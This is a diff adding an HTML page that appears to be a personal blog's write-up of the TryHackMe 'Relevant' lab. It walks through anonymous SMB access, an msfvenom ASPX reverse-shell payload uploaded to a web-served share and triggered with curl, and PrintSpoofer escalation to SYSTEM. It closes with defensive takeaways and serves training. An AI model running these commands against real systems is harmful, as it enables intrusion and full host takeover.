@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Relevant — TryHackMe Writeup (Lanky)</title>
+  <meta name="description" content="TryHackMe: Relevant — SMB writable share, ASPX webshell, SeImpersonatePrivilege to SYSTEM.">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#writeups">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#writeups">back to writeups</a>
+    <h1 style="margin-top:16px;">Relevant</h1>
+    <div class="subtitle">TryHackMe · <a href="https://tryhackme.com/room/relevant" target="_blank" rel="noopener">tryhackme.com/room/relevant</a></div>
+    <div class="machine-meta">
+      <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
+      <span class="pill diff-medium">Medium</span>
+      <span class="pill">SMB · IIS · SeImpersonate</span>
+      <span class="pill rooted">● completed</span>
+    </div>
+
+    <div class="contact" style="margin:0 0 22px;">
+      <a class="btn primary" href="https://www.youtube.com/watch?v=VW17e6YKuUw" target="_blank" rel="noopener">▶ Watch the walkthrough</a>
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      A writable SMB share (<code>nt4wrksv</code>) is also served by IIS on a high port → drop an
+      <strong>ASPX webshell</strong> for RCE as the app-pool account → <strong>SeImpersonatePrivilege</strong>
+      → PrintSpoofer for <strong>SYSTEM</strong>.
+    </div>
+
+    <h2><span class="num">01</span>Recon</h2>
+    <pre data-lang="bash"><code>nmap -sC -sV -p- -oN nmap/relevant 10.10.X.X
+# 80, 135, 139, 445 SMB, 3389 RDP, 49663 (IIS HTTP), 49667
+smbclient -N -L //10.10.X.X/           # share: nt4wrksv (READ/WRITE)
+smbclient -N //10.10.X.X/nt4wrksv
+# get passwords.txt -> base64 creds (Bob / Bill)</code></pre>
+
+    <h2><span class="num">02</span>Foothold — SMB → IIS webshell</h2>
+    <p>The <code>nt4wrksv</code> share maps to <code>http://10.10.X.X:49663/nt4wrksv/</code>. Upload an ASPX webshell to the share and browse to it for code execution:</p>
+    <pre data-lang="bash"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
+smbclient -N //10.10.X.X/nt4wrksv -c 'put shell.aspx'
+# trigger:
+curl http://10.10.X.X:49663/nt4wrksv/shell.aspx     # -> shell as iis apppool\defaultapppool</code></pre>
+    <div class="flag"><span class="label">user.txt</span>THM{…} (Bob's Desktop)</div>
+
+    <h2><span class="num">03</span>Privilege Escalation — SeImpersonate</h2>
+    <pre data-lang="bash"><code>whoami /priv        # SeImpersonatePrivilege = Enabled
+# potato-style privesc:
+.\PrintSpoofer64.exe -i -c cmd     # -> NT AUTHORITY\SYSTEM</code></pre>
+    <div class="flag"><span class="label">root.txt</span>THM{…} (Administrator Desktop)</div>
+
+    <h2><span class="num">04</span>Takeaways</h2>
+    <ul>
+      <li><strong>Never leave SMB shares world-writable</strong>, especially when the same path is web-served.</li>
+      <li><strong>Don't store credentials in files on shares</strong> — base64 is encoding, not protection.</li>
+      <li><strong>SeImpersonate on service accounts = SYSTEM</strong> via Potato/PrintSpoofer — scope service privileges tightly.</li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#writeups">back to writeups</a></p>
+  </article>
+
+  <footer><div class="wrap">Relevant · TryHackMe · Lanky &nbsp;·&nbsp; <a href="../index.html#writeups">all writeups</a></div></footer>
+</body>
+</html>
